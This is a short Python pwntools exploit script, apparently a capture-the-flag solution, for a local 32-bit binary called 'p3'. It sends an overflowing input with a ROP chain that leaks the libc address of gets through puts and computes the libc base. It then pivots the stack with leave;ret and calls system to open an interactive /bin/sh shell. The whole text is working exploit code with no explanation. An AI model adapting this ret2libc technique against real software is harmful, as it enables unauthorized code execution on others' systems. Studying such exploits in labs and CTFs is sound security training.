from pwn import *

context.log_level='debug'

elf = ELF('p3')
lib = ELF('/lib32/libc.so.6')

puts = elf.symbols['puts']
gets = elf.symbols['gets']
gets_got = elf.got['gets']
gets_off = lib.symbols['gets']
system_off = lib.symbols['system']

pop_ebp_ret = 0x0804854b
leave_ret = 0x08048408

buf1 = 0x0804b000 - 700
buf2 = 0x0804b000 - 1300
buf3 = 0x0804b000 - 2000

rop1 = [
	puts,
	pop_ebp_ret,
	gets_got,
	gets,
	pop_ebp_ret,
	buf2,
	pop_ebp_ret,
	buf2 - 4,
	leave_ret	
]

io = process('p3');
io.send('a'*22 + flat(rop1) + '\n')
print io.recvline()

lib_base = u32(io.recvline()[:4]) - gets_off
print "lib_base: " + hex(lib_base)
system = lib_base + system_off

rop2 = [
	gets,
	system,
	buf3,
	buf3
]

io.sendline(flat(rop2))
sleep(2)
io.sendline('/bin/sh\x00')
io.interactive()

